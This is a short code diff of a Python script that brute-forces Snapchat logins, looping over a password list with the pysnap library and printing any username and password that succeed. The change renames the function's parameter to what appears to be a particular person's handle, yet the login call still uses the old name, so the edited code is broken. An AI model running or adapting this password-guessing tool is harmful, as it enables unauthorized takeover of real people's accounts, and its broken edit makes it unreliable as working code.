@@ -4,15 +4,15 @@ from pysnap import Snapchat
 import sys
 import os
 
-def crack(username):
-	print("now cracking: " + username)
+def crack(jdrisle):
+	print("now cracking: " + jdrisle)
 	snapchat = Snapchat()
 	passwords = open("passwords.txt","r")
 	i = 0
 	for password in passwords:
 		result = snapchat.login(username,password)
 		if (result['logged']!=False):
-			print("success: username: " + username + "\t password: " + password)
+			print("success: username: " + jdrisle + "\t password: " + password)
 			break
 		else:
 			print(str(i))
